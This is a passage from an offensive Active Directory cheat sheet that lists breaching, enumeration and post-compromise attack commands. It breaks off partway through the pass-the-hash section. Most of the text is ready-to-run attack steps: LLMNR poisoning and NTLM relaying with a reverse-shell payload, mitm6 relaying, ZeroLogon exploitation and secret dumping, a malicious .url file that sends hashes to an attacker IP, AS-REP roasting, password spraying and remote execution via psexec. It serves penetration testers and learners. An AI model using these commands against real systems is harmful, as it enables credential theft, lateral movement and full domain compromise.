# Index

- [Breaching](#Breaching)
	- [SMB Enumeration](#SMBenumeration)
	- [LDAP Enumeration](#LDAPenumeration)
	- [Net-NTLM cracking](#NetNTLMcracking)
	- [Net-NTLM relaying](#*NetNTLMrelaying*)
	- [IPv6 attacks](#IPv6attacks)
	- [Passback attacks](#PassbackAttacks)
	- [AS-REP Roasting](#AS-REPRoasting)
	- [ZeroLogon](#ZeroLogon)
	- [Forced Authentication](#ForcedAuthentication)
		- [URL file attacks](#URLFileAttacks)
		- [Webapp Vulnerabilities](#WebappVulnerabilities)
	- [Others](#Others)
- [Enumeration](#Enumeration)
	- [SMB Enumeration-internal](#SMBenumerationInternal)
	- [PowerView](#PowerView)
	- [BloodHound](#BloodHound)
	- [ldapdomaindump](#ldapdomaindump)
	- [Powershell AD Module](#PowershellADModule)
	- [Powershell Port Scan](#PowershellPortScan)
	- [Custom Script](#CustomScript)
- [Post Compromise Attacks](#PostCompromiseAttacks)
	- [Net-NTLM cracking - Post Exploitation](#NetNTLMcrackingPostExp)
	- [Net-NTLM relaying - Post Exploitation](#NetNTLMrelayingPostExp)
	- [Pass the Password](#PassThePassword) 
	- [Password Spraying](#PasswordSpraying)
	- [Pass the Hash](#PassTheHash)
	- [AS-REP Roasting (PostExp)](#AS-REPRoasting(PostExp))
	- [Kerberoasting](#Kerberoasting)
	- [Group Policy Preferences](#GroupPolicyPreferences)
	- [PrintNightmare](#PrintNightmare)
	- [Pass The Ticket](#PassTheTicket)
	- [Overpass-the-hash/Pass-the-Key](#OverpassTheHash/PassTheKey)
	- [DCSync](#DCSync)
	- [GPO abuse](#GPOabuse)
	- [Abusing Group Managed Service Accounts](#AbusingGroupManagedServiceAccounts)
	- [Token Impersonation](#TokenImpersonation)
	- [Abusing Active Directory Certificate Services](#AbusingActiveDirectoryCertificateServices)
	- [Mimikatz](#Mimikatz)
		- [Extracting Secrets](#ExtractingSecrets)
		- [Pass The Hash](#PassTheHashMimikatz)
		- [Pass The Ticket](#PassTheTicketMimikatz)
		- [Overpass-the-hash/Pass-the-Key](#OverpassTheHash/PassTheKeyWithMimikatz)
		- [Token Impersonation](#TokenImpersonationMimikatz)
		- [Silver Tickets](#SilverTicketsMimikatz)
		- [DCSync](#DCSyncMimikatz)
	- [Abusing ACL/ACE](#AbusingACL/ACE)
		- [Kerberos Resource-Based Constrained Delegation](#KerberosResource-BasedConstrainedDelegation)
		- [ReadLAPSPassword](#ReadLAPSPassword)
		- [GenericAll Over User](#GenericAllOverUser)
	- [Privileged Groups](#PrivilegedGroups)
		- [Account Operators](#AccountOperators)
		- [AdminSDHolder](#AdminSDHolder)
		- [ADRecycleBin](#ADRecycleBin)
		- [BackupOperators](#BackupOperators)
		- [DNSAdmins](#DNSAdmins)
		- [Event Log Readers](#EventLogReaders)
		- [Print Operators](#PrintOperators)
		- [Remote Desktop Users](#RemoteDesktopUsers)
		- [Remote Management Users](#RemoteManagementUsers)
		- [Server Operators](#ServerOperators)
		- [Distributed COM Users](#DistributedCOMUsers)
	- Dump Secrets:
		- [SAM](#SAM)
		- [LSA secrets](#LSAsecrets)
		- [NTDS.dit](#NTDS.dit)
		- [LSASS](#LSASS)
- [Domain Admins Persistence](#DomainAdminsPersistence)

# Breaching

**Use case**: we are outside the Active Directory perimeter and the goal is to find valid credentials.

## SMBenumeration

- **hostname**
	- `nmblookup -A <IP target>`
	- `nbtscan -r <IP target>/<CIDR>`
	- `sudo nmap --script nbtstat.nse <IP target>`
	- (*windows*) `nbtstat -A <IP target>`
	- (*windows*)`ping -a <IP target>`
- **checking vulnerabilities**
	- `sudo nmap --script smb-vuln* <IP target>`
- **null session**
	- `crackmapexec smb <IP target> -u '' -p ''`
	- `smbmap -H <IP target> -P <PORT SMB, deafult 445>`
	- `smbclient -N -L <IP target>`
- **anonymous login**
	- `crackmapexec smb <IP target> -u guest -p ''`
- **general enumeration**
	- `crackmapexec smb <IP target> -u guest -p '' --shares --rid-brute --users --groups --loggedon-users`
- **share access**
	-  `smbclient //<IP target>/<share>`
	- `smbclient //<IP target>/<share> -U 'guest%'`
	- (*windows*)
		- `net view \\<IP target> /All`
		- `net use \\<IP target>\share`
- **files share enumeration**
	- *listing*
		- `crackmapexec smb <IP target> -u guest -p '' -M spider_plus`
		- `smbmap -d '<DOMAIN>' -u guest -p '' -H <IP target> -r/-R <SHARE NAME>`
	- *dumping*
		- `crackmapexec smb <IP target> -u guest -p '' -M spider_plus -o READ_ONLY=false`
		- `smbmap -d '<DOMAIN>' -u guest -p '' -H <IP target> --download '<SHARE NAME>/path/to/file'`
	- *mounting
		1. `mkdir /tmp/<SHARE NAME>`
		2. (*null access*) `sudo mount -t cifs //<IP target>/<SHARE NAME> /tmp/<SHARE NAME>`
		3. `cd /tmp/<SHARE NAME> && find .`

## LDAPenumeration

- **anonymous bind**: 
	- `ldapsearch -x -H ldap://<IPTARGET>:<LDAP PORT> -D '' -w '' -b "DC=htb,DC=local" samaccountname description`

## NetNTLMcracking

**Tools**:
- [Responder](https://github.com/SpiderLabs/Responder)
- `hashcat`

**Steps**:
1. *Responder.py* setup
	-  `sudo python3 Responder.py -I <interface> -wdv`
2. ..*waiting for events to force NTLM authentication*..
	- ***with** code execution*:
		- `ls \\<ATTACKER IP>\share`
	- ***without** code execution*:
		- if we discover a file upload form in a webapp on Windows server we could try to insert a non-existing file with a UNC path such as `\\<ATTACKER IP>\share\nonexistent.txt`
		- if webapp supports upload via SMB, the server will authenticate to the SMB server of the Responder
		- *Server Side Request Forgery*
3. *cracking* - `hashcat -m 5600 <Net NTLM.txt> <wordlist>`

## NetNTLMrelaying

### classic

**Requirements**:
- SMB signing disabled on target machine
- user we are relaying NetNTLM must be local admin on the target machine

**Tools**:
- `nmap`
- `crackmapexec`
- `ntlmrelayx.py` - *impacket*

**Steps**:
1. identify targets that do not require *SMB signing* ("*signing enable but not required*"):
	- `sudo nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 <IP target>`
	- `crackmapexec smb <IP target> --gen-relay-list targets.txt`
2. netcat *listener* listening on a given port
3. *ntlmrelayx.py* setup:
	- `sudo python3 ntlmrelayx.py --no-http-server -smb2support -t <IP MACHINE TARGET> -c "powershell -enc JABjAG[PAYLOAD POWERSHELL REVERSE SHELL BASE64 ENCODED]"`
4. ..*waiting for events to force NTLM authentication*..
	- ***with** code execution*:
		- `ls \\<ATTACKER IP>\share`
	- ***without** code execution*:
		- if we discover a file upload form in a webapp on Windows server we could try to insert a non-existing file with a UNC path such as `\\<ATTACKER IP>\share\nonexistent.txt`
		- if webapp supports upload via SMB, the server will authenticate to the SMB server of the Responder

*ntlmrelayx*, by default, without specifying a command, dumps sensitive info (SAM) of the target. Alternatively:
- get a shell - `sudo python3 ntlmrelayx.py -tf targets.txt -smb2support -i`
- custom binary execution - `sudo python3 ntlmrelayx.py -tf targets.txt -smb2support -e <reverse_shell.exe>`
- command execution - `sudo python3 ntlmrelayx.py -tf targets.txt -smb2support -c "<command>"`

### LLMNR & NetBIOS Poisoning

LLMNR and NBT-NS are two protocols enabled by default on Windows systems and their purpose is to support operating system when it is unable to resolve a "hostname" via DNS service or its local host file.

**Requirements**:
- SMB signing disabled on target machine
- user we are relaying NetNTLM must be local admin on the target machine

**Tools**:
- `nmap`
- `crackmapexec`
- [Responder](https://github.com/SpiderLabs/Responder)
- `ntlmrelayx.py` - *impacket*

**Steps**:
1. identify targets that do not require *SMB signing* ("*signing enable but not required*"):
	- `sudo nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 <IP target>`
	- `crackmapexec smb <IP target> --gen-relay-list targets.txt`
2. *Responder.py* setup:
	- *Responder.conf* editing:
		- `SMB = Off`
		- `HTTP = Off`
	- execution - `sudo python3 Responder.py -I <interface> -wdv`
3. *ntlmrelayx.py* setup:
	- `sudo python3 ntlmrelayx.py -tf targets.txt -smb2support`
4. ..*waiting for events to force NTLM authentication*..
	- ***with** code execution*:
		- `ls \\<ATTACKER IP>\share`
	- ***without** code execution*:
		- if we discover a file upload form in a webapp on Windows server we could try to insert a non-existing file with a UNC path such as `\\<ATTACKER IP>\share\nonexistent.txt`
		- if webapp supports upload via SMB, the server will authenticate to the SMB server of the Responder
5. by default, without specifying a command, dumps sensitive info (SAM) of the target. Alternatively:
	- get a shell - `sudo python3 ntlmrelayx.py -tf targets.txt -smb2support -i`
	- custom binary execution - `sudo python3 ntlmrelayx.py -tf targets.txt -smb2support -e <reverse_shell.exe>`
	- command execution - `sudo python3 ntlmrelayx.py -tf targets.txt -smb2support -c "<command>"`

## IPv6attacks

**Requirements**:
- IPv6 enabled

**Tools**:
- [mitm6](https://github.com/dirkjanm/mitm6)
- `ntlmrelayx.py` - *impacket*

**Steps**:
1.  _mitm6_ setup: 
	- `sudo python3 mitm6.py -d <DOMAIN NAME>`
2. *ntlmrelayx.py* setup: 
	- `sudo python3 ntlmrelayx.py -6 -t ldaps://<IP DC> -wh fakewpad.<DOMAIN NAME> -l outputdir`
3. ..*waiting for users to restart the machine or network service*..
	- if privilege users, such as a member of the *Domain Admins* group, it is possible to create a new user, add him to the *Domain Admins* group and, in effect, compromise the entire domain
	- if not privileged, we can authenticate at the DC and dump the information at the database via LDAP or SMB
4. data dump at `outputdir`

## PassbackAttacks

Classic attack involving printers and IoT devices.

**Requirements**:
- be able to change settings regarding LDAP server, SMTP or network share

*Assume LDAP server* - **Steps**:
1. OpenLDAP installation:
	- `sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`
2. *slapd* setup:
	- `sudo dpkg-reconfigure -p low slapd`
	- *Omit OpenLDAP server configuration? No.*
	- *DNS domain name*: `<DOMAIN NAME>`
	- *Organization name*: `<DOMAIN NAME>`
	- *Administrator password:* any
	- *Database backend to use:* `MDB`
	- *Do you want the database to be removed when slapd is purged? No.*
	- creazione file `olcSaslSecProps.ldif`:
	```text
	#olcSaslSecProps.ldif
	dn: cn=config
	replace: olcSaslSecProps
	olcSaslSecProps: noanonymous,minssf=0,passcred
	```
	- `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`
3. check the configuration of the *rogue* server:
	```shell
	$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
	dn:
	supportedSASLMechanisms: PLAIN
	supportedSASLMechanisms: LOGIN
	```
4. dump of the network traffic we receive on port 389, which is our LDAP server::
	- `sudo tcpdump -SX -i breachad tcp port 389`
5. we change the IP address of the LDAP server with which the IoT device was configured to our IP and wait or trigger an event that causes users to authenticate to our server

## AS-REPRoasting

**Requirements**:
- valid usernames for which the *UF_DONT_REQUIRE_PREAUTH* property is set

**Tools**:
- [kerbrute](https://github.com/ropnop/kerbrute)
- `GetNPUsers.py` - *impacket*
- `hashcat`
- wordlist of valid usernames can be generated ([thanks](https://dzmitry-savitski.github.io/2020/04/generate-a-user-name-list-for-brute-force-from-first-and-last-name)):
	- `curl https://gist.githubusercontent.com/dzmitry-savitski/65c249051e54a8a4f17a534d311ab3d4/raw/5514e8b23e52cac8534cc3fdfbeb61cbb351411c/user-name-rules.txt >> /etc/john/john.conf`
	- `john --wordlist=wordlist_user.txt --rules=Login-Generator-i --stdout > usernames.txt`

**Steps**:
1. identify valid usernames with *kerbrute*
	- add  `<IP target> <DOMAIN NAME>` to the hosts file
	- `./kerbrute_linux_amd64 userenum --dc <IP DC> -d <DOMAIN NAME> <USERNAME WORDLIST>`
2. identify *AS-REP roastable* users:
	- `python3 GetNPUsers.py <DOMAIN NAME>/ -dc-ip <IP DC> -usersfile <users.txt>`
3. get *AS-REP* ticket for vulnerable user:
	- `python3 GetNPUsers.py -dc-ip <IP DC> -request -outputfile <AS-REP.txt> '<DOMAIN NAME>/<USERNAME>'`
4. *AS-REP* ticket cracking:
	- `hashcat -m 18200 <AS-REP.txt> <wordlist>`

## ZeroLogon

**Tools**:
- ZeroLogon checker: [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
- ZeroLogon exploit: [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
- `secretsdump.py` - *impacket*

**Steps**:
1. identify *NetBIOS name* DC:
	- `nbtscan <IP DC>`
2. checker:
	- `python3 zerologon_tester.py <NetBIOS name DC> <IP DC>`
3. exploit:
	- `python3 cve-2020-1472-exploit.py <NetBIOS name DC> <IP DC>`
4. dump *secrets* DC:
	- `python3 secretsdump.py -no-pass <DOMAIN NAME>/'<NetBIOS name DC>$'@<IP DC>`

## ForcedAuthentication

**Goal**: force NTLM authentication by the target machine. You can use the script [https://github.com/xct/hashgrab](https://github.com/xct/hashgrab) to generate SCF, URL and LNK files in one go. NTLM authentication is forced ***automatically*** when a share containing SCF, URL or LNK files is visited.

### URLFileAttacks

**Scenario**: assume that a share is present and a scheduled user/task browses it. This causes it to force, **automatically**, an NTLM authentication attempt that can be "caught" via the *Responder*. The attack is to force NTLM authentication.

**Steps**:
1. Malicious file creation - the file name must be of the type `@something.url`:
```text
[InternetShortcut] 
URL=blah 
WorkingDirectory=blah 
IconFile=\\<IP ATTACKER>\%USERNAME%.icon 
IconIndex=1
```
2. *Responder.py* setup:
	- `sudo python3 Responder.py -I <IFACE> -wdv`
3. file should be uploaded to the share where we have write permissions and where the victim also has access
4. obtained hashes we have two alternatives:
	- NetNTLM cracking
	- *NTLM Relay*

#### other techniques - file attacks

- **useful resources**: 
	- [https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication)
	- [https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds](https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds)
- in addition to *.URL* files, it is possible to force NTLM authentication through a lot of possibilities
	- hyperlink in Word document
	- .SCF file
	- .LNK file
	- image in a .RTF file
	- `IncludePicture` field in a Word document.
	- HTTP image and internal DNS
	- MySQL `Load_File` function, SQL injection
	- MSSQL, SQL injection
	- Redis `eval` function

## WebappVulnerabilities

- **resources**: 
	- [https://www.blazeinfosec.com/post/web-app-vulnerabilities-ntlm-hashes/](https://www.blazeinfosec.com/post/web-app-vulnerabilities-ntlm-hashes/)
	- [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)

A lot of web vulnerabilities allow NTLM authentication to be forced:
- Server Side Request Forgery
- Remote File Inclusione Local File Inclusion
- MySQL injection (example: [https://www.mannulinux.org/2020/01/stealing-ntlmv2-hash-by-abusing-sqlInjection.html](https://www.mannulinux.org/2020/01/stealing-ntlmv2-hash-by-abusing-sqlInjection.html))
- MSSQL injection ([example](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/))
- XXE (example: [here](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) and [https://shubhamchaskar.com/xxe-to-ntlm/](https://shubhamchaskar.com/xxe-to-ntlm/))
- XPATH injection ([example](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/))
- XSS ([example](https://www.blazeinfosec.com/post/web-app-vulnerabilities-ntlm-hashes/))

## Others

Possible paths:
- RCE from web app
- reverse shell upload in ASP/ASPX format in open share and retrieve from web app
- PowerShell scripts in a share can be executed by scheduled tasks. Edit the content and get the reverse shell

# Enumeration

**Use case**: we have valid domain credentials and the goal is to retrieve more information about the domain.

## SMBenumerationInternal

- **general enumeration**:
	- `crackmapexec smb <IP target> -u <USERNAME> -p <PASSWORD> --shares --sessions --disks --loggedon-users --users --groups --computers --local-groups --pass-pol --rid-brute`
- **share access**:
	-  `smbclient //<IP target>/<share> -U '<DOMAIN>/<USERNAME>%<PASSWORD>'`
- **files share enumeration**:
	- *listing*
		- `crackmapexec smb <IP target> -u <USERNAME> -p <PASSWORD> -M spider_plus`
		- (*windows inside*) `net view \\<HOSTNAME TARGET> /all`
	- *dumping*
		- `crackmapexec smb <IP target> -u <USERNAME> -p <PASSWORD> -M spider_plus -o READ_ONLY=false`
	- *mounting
		1. `mkdir /tmp/<SHARE NAME>`
		2. (*null access*) `sudo mount -t cifs //<IP target>/<SHARE NAME> /tmp/<SHARE NAME> -o username=USER,password=PASSWORD,domain=DOMAIN`
		3. `cd /tmp/<SHARE NAME> && find .`

## PowerView

Source: [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)

**Requirements**:
- shell in a machine joined domain
- script import:
	- `powershell -ep bypass`
	- `. .\PowerView.ps1`

Command list:
- **domain information**
	- `Get-NetDomain`
- **DC information**
	- `Get-NetDomainController`
- **policy information**
	- `Get-DomainPolicy`
	- *password policy*: `(Get-DomainPolicy)."SystemAccess"`
- **users domain**
	- `Get-NetUser`
	- `Get-NetUser | select samaccountname, name, description, objectsid | Format-List`
	- *specific user*: `Get-NetUser -identity <samaccountname>`
- **computers domain**
	- `Get-NetComputer`
	- `Get-NetComputer | select dnshostname, samaccountname, samaccounttype, operatingsystem, operatingsystemversion, objectsid`
- **domain groups**
	- `Get-NetGroup`
	- *specific group*: `Get-NetGroup '<GROUP NAME>'`
	- *user's group*: `Get-NetGroup -UserName "<USERNAME>"`
- **"admin" domain groups**
	- `Get-DomainGroup *admin* -Properties samaccountname`
-  **group members**
	- `Get-NetGroupMember "<GROUP NAME>"`
	- ***recursive** version*: `Get-NetGroupMember -Identity "<GROUP NAME>" -Recurse | select MemberName, MemberObjectClass`
		- for this, the best is "*Get-ADNestedGroupMembers.ps1*" (**based on AD RSAT**)
- **objects that have *dangerous privileges***
	- *..on a group/user*: `$acls=Get-ObjectAcl -Identity "<GROUPNAME/USERNAME>" | ? {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteOwner|WriteDACL|AllExtendedRights|ForceChangePassword|Self"}; foreach ($acl in $acls) { $acl | Select @{name="WHO";expression={$(Convert-SidToName $acl.SecurityIdentifier)}}, @{name="HAS PRIVILEGES";expression={$acl.ActiveDirectoryRights}}, @{name="OVER THAT";expression={$(Convert-SidToName $acl.ObjectSID)}} | ft}`
	- *.. on a computer*: `$acls=Get-ObjectAcl -Identity "<SAMACCOUNTNAME COMPUTER ACCOUNT BY Get-NetComputer>" | ? {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteOwner|WriteDACL|AllExtendedRights|ForceChangePassword|Self"}; foreach ($acl in $acls) { $acl | Select @{name="WHO";expression={$(Convert-SidToName $acl.SecurityIdentifier)}}, @{name="HAS PRIVILEGES";expression={$acl.ActiveDirectoryRights}}, @{name="OVER THAT";expression={$(Convert-SidToName $acl.ObjectSID)}} | ft}`
- **SID to samaccountname**
	- `"SID1","SID2","SID...","SIDN" | Convert-SidToName`
- **domain shares**
	- `Find-DomainShare`
	- `Find-DomainShare -CheckShareAccess`
- **domain GPOs**
	- `Get-NetGPO`
	- `Get-NetGpo | select DisplayName, whenchanged`
- **"Default Domain Policy" GPO information**
	- `Get-GPO -Name "Default Domain Policy"`
- **permissions on "Default Domain Policy" GPO**
	- `Get-GPPermission -Guid "<ID Default Domain Policy GPO>" -TargetType User -TargetName <SAMACCOUNTNAME USER OWNED>`
- **hostname to IP**
	- `Resolve-IPAddress <hostname>`
- **active user sessions**
	- `Get-NetSession -ComputerName <COMPUTER NAME> -verbose`
	- *alternative*: `.\PsLoggedon.exe -accepteula -nobanner \\<COMPUTER NAME>`
- **current user as *local admin* user at other machines** (*very noisy*)
	- `Find-LocalAdminAccess`
- **AS-REP roastable users**
	- `Get-NetUser -PreauthNotRequired`
- **Kerberoastable users**
	- `Get-NetUser -SPN | select samaccountname,serviceprincipalname`
- **DCSync objects**
	- `Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}`
- **principals who can read LAPS passwords**
	- `Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object { $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_ }`

## BloodHound

***Ingestor** setup*:
- *remotely* (**NOT able to detect active sessions**):
	- `bloodhound-python -u <USERNAME> -p '<PASSWORD>' -ns <DC IP> -d <DOMAIN NAME> --zip -c All`
- upload to target (**able to detect active sessions**)::
	- source: [https://github.com/BloodHoundAD/SharpHound/releases](https://github.com/BloodHoundAD/SharpHound/releases)
	- `powershell -ep bypass`
	- `. .\SharpHound.ps1`
	- `Invoke-Bloodhound -CollectionMethods All -Domain <DNS domain name> -ZipFileName output.zip`

**BloodHound** *setup*:
- `sudo neo4j console`
- `bloodhound`

**Node Info** (*User node*):
- a node of type *Users* is considered. For all other node types [https://bloodhound.readthedocs.io/en/latest/data-analysis/nodes.html](https://bloodhound.readthedocs.io/en/latest/data-analysis/nodes.html)
- *Group Membership*
	- *First Degree Group Memberships*: the "[AD security groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#default-active-directory-security-groups)" to which the user is directly connected
	- *Unrolled Group Membership*: groups to which the user actually belongs taking into account the *nested groups*
	- *Foreign Group Membership*: groups of other AD domains to which the user belongs
- *Local Admin Rights*
	- *First Degree Local Admin*: computer to which the user has been added to the local "Administrators" group
	- *Group Delegation Local Admin Rights*: "AD security groups" can be added to the local "Administrators" group. This shows the computers where the user is *local admin* via "security group delegation," regardless of the depth of the groups themselves
- *Execution Privileges*
	- *First Degree RDP Privileges*: computer where the user has been added to the local "Remote Desktop Users" group
	- *Group Delegated RDP Privileges*: as before, but via "security group delegation"
	- *First Degree DCOM Privileges*: as above, but to the local group "Distributed COM"
	- *Group Delegated DCOM Privileges*
	- *SQL Admin Rights*: number of computers where the user is most likely to have "SQL admin" privileges on an MSSQL instance
- *Outbound Object Control*
	- *First Degree Object Control*: AD objects that can be controlled by the current user
	- *Unrolled Object Controllers*: AD objects in which the user has control via "security group delegation," regardless of the depth of the groups themselves
	- *Transitive Object Control*: AD objects where the user can gain control without the need to pivot to other systems in the network, but simply by manipulating the objects present
- *Inbound Object Control*
	- *Explicit Object Controllers*: users, groups or computers that have complete control over the current user
	- *Unrolled Object Controllers*: AD objects that have control of the object via "security group delegation"
	- *Transitive Object Controllers*: AD objects that can control the object through "ACL-based" attacks

**custom query**:
- cheatsheet
	- [https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
- computers
	- `MATCH (m:Computer) RETURN m`
- users
	- `MATCH (u:User) RETURN u`
- active sessions
	- `MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p`

## ldapdomaindump

Source: [https://github.com/dirkjanm/ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)

**Step**:
- `python3 ldapdomaindump <HOSTNAME/IP LDAP SERVER> -u '<DOMAIN NAME>\<USERNAME>' -p '<PASSWORD>' -o <OUTPUTDIR>`

## PowershellADModule

Source: [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-enumeration-with-ad-module-without-rsat-or-admin-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-enumeration-with-ad-module-without-rsat-or-admin-privileges)

**Requirements**:
- shell access to a domain joined machine

To use Active Directory's PowerShell module commands on a machine that does not have RSAT installed follow these steps::
1. upload the following DLL to the target machine.: [https://github.com/samratashok/ADModule/raw/master/Microsoft.ActiveDirectory.Management.dll](https://github.com/samratashok/ADModule/raw/master/Microsoft.ActiveDirectory.Management.dll)
2. run PowerShell on the target machine: `powershell -ep bypass`
3. importing DLL: `Import-Module .\Microsoft.ActiveDirectory.Management.dll`
4. use cmdlets such as, for example, `Get-ADUSer -Filter *`

## PowershellPortScan

```powershell
<START PORT>..<END PORT> | % {echo ((New-Object Net.Sockets.TcpClient).Connect("<IP TARGET>", $_)) "TCP port $_ is open"} 2>$null
```

## CustomScript

**Use case**:
- no possibility of downloading scripts to target machine
- Powershell shell

Source: [https://payatu.com/blog/ad-enumeration-without-external-scripts/](https://payatu.com/blog/ad-enumeration-without-external-scripts/)

```powershell
# domain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
# domain forests trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
# enumerate all DCs
([ADSISearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))").FindAll()
# find PdC
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
# all domain computers
([ADSISearcher]"ObjectClass=computer").FindAll()
# enumerate all domain users
([ADSISearcher]"(&(objectClass=user)(samAccountType=805306368))").FindAll()
# enumerate all domain users - specific property
([ADSISearcher]"(&(objectClass=user)(samAccountType=805306368))").FindAll()| %{ $_.Properties["samaccountname"] }
# enumerate single user
([ADSISearcher]"(&(objectClass=user)(samAccountType=805306368)(samaccountname=<SAMACCOUNTNAME>))").FindAll().Properties
# all users with SPN
([ADSISearcher]"(&(objectClass=user)(servicePrincipalName=*)(samAccountType=805306368))").FindAll()
# enumerate all groups
([ADSISearcher]"ObjectClass=group").FindAll()
# enumerate single group
([ADSISearcher]"(&(ObjectClass=group)(samaccountname=<GROUP NAME>))").FindOne()
# all member groups
([ADSISearcher]"(distinguishedname=<DISTINGUISH NAME GROUP>)").FindOne().Properties.member
```

```shell
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}
```
- all users:
	- `LDAPSearch -LDAPQuery "(samAccountType=805306368)"`
- all groups:
	- `LDAPSearch -LDAPQuery "(objectclass=group)"`
- group members:
	- `$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))"`
	- `$group.properties.member`

# PostCompromiseAttacks

## NetNTLMcrackingPostExp

What is the point of forcing an NTLM authentication when we already have a shell on the compromised machine?

Assume we have a shell with a non-privileged user whose password we do not know. Without administrator privileges we cannot use *mimikatz* to extract hashes. Forcing an NTLM authentication, in this context, **allows us to have the opportunity to know its password** through cracking.

For details please refer to [Net-NTLM cracking](#NetNTLMcracking).
## NetNTLMrelayingPostExp

What is the point of forcing an NTLM authentication and doing *Net-NTLM relay* when we already have a shell on the compromised machine?

Assume we have a shell with a non-privileged user whose password we do not know on the MACHINE1 machine. Without administrator privileges we cannot use *mimikatz* to extract hashes. Moreover, its Net-NTLM hash is not "crackable." Assume, also, that the unprivileged user on MACHINE1 is instead a *local admin* on MACHINE2.

For details please refer to [Net-NTLM relaying](#NetNTLMrelaying).

## PassThePassword

**Requirements**:
- username and password of local account and/or domain
- check open ports at the target: LDAP (389/TCP), SMB (445/TCP), MSSQL (1433/TCP), RDP (3389/TCP), WinRM (5985/TCP)

**Use case**:
- reuse of accounts in different machines

Command list:
- **local account reuse**
	- `crackmapexec ldap/smb/mssql/rdp/winrm <IP TARGET> -u <USERNAME> -p <PASSWORD> --local-auth --continue-on-success`
- **domain account reuse**
	- avoid `STATUS_ACCOUNT_LOCKED_OUT`: testing credentials to a single host and then *spraying* to all of them
	- `crackmapexec ldap/smb/mssql/rdp/winrm <IP TARGET> -d <DOMAIN NAME> -u <USERNAME> -p <PASSWORD> --continue-on-success`
- **evil-WinRM** (*WinRM + "Remote Management Users"*)
	- `evil-winrm -i <IP TARGET> -u <USERNAME> -p <PASSWORD>`
- **RDP** (*RDP* + *Remote Desktop Users*)
	- `xfreerdp +clipboard /v:<IP TARGET> /u:<USERNAME> '/p:<PASSWORD>'`
- **psexec.py**
	- `python3 psexec.py <DOMAIN NAME>/'<USERNAME>:<PASSWORD>'@<IP TARGET>`
- **wmiexec.py** (*shell with specific user - does not make elevation to SYSTEM*)
	- `python3 wmiexec.py <DOMAIN NAME>/'<USERNAME>:<PASSWORD>'@<IP TARGET>`
- **secretsdump.py (hash and secrets dump)**
	- `python3 secretsdump.py <DOMAIN NAME>/'<USERNAME>:<PASSWORD>'@<IP TARGET>`

## PasswordSpraying

**Requirements**:
- password
- check open ports at the target: Kerberos (88/TCP), LDAP (389/TCP), SMB (445/TCP), MSSQL (1433/TCP), RDP (3389/TCP), WinRM (5985/TCP)

**Use case**:
- given a password, you want to try it with a wordlist of usernames

Command list:
- *LDAP*, *SMB*, *MSSQL*, *RDP*, *WinRM*
	- avoid `STATUS_ACCOUNT_LOCKED_OUT`: testing credentials to a single host and then *spraying* to all of them
	- `crackmapexec ldap/smb/mssql/rdp/winrm <IP TARGET> -u <USERNAME WORDLIST> -p <PASSWORD> --continue-on-success`
- *Kerberos*
	- `.\kerbrute_linux_amd64 passwordspray -d <DOMAIN NAME> <USERNAME WORDLIST> "<single password to check>"`

## PassTheHash

**Requirements**:
- username and password hash of local account and/or domain
- check open ports at the target: LDAP (389/TCP), SMB (445/TCP), MSSQL (1433/TCP), RDP (3389/TCP), WinRM (5985/TCP)

**Use case**:
- reuse of accounts in different machines

LM hash, when not set, is equal to _aad3b435b51404eeaad3b435b51404ee_.

Command list:
- **crackmapexec (local accounts)**
